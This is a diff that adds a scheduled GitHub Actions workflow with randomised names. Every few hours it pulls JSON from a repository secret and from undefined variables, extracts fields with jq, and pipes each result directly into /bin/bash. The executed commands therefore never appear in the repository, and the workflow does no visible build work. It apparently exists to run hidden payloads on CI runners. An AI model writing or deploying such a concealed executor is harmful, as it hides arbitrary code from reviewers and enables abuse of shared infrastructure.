@@ -1,0 +1,24 @@
+name: juanshixinshao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: juanshixinshao
+        env:
+          jidyg42651: ${{ secrets.jidyg42651 }}
+        run: |
+          echo $jidyg42651 | jq -r .rwkkw77 | /bin/bash
+          echo $gdz8352 | jq -r .sdw17261 | /bin/bash
+          echo $c84 | jq -r .tkur1 | /bin/bash
+          echo $qek13208 | jq -r .h7476 | /bin/bash
+          echo $lqdb264 | jq -r .pc614 | /bin/bash
+          echo $hu9790 | jq -r .tb566 | /bin/bash
+          echo $n8795 | jq -r .zu78724 | /bin/bash
+          echo $qzmeg74152 | jq -r .jgzz0916 | /bin/bash
+
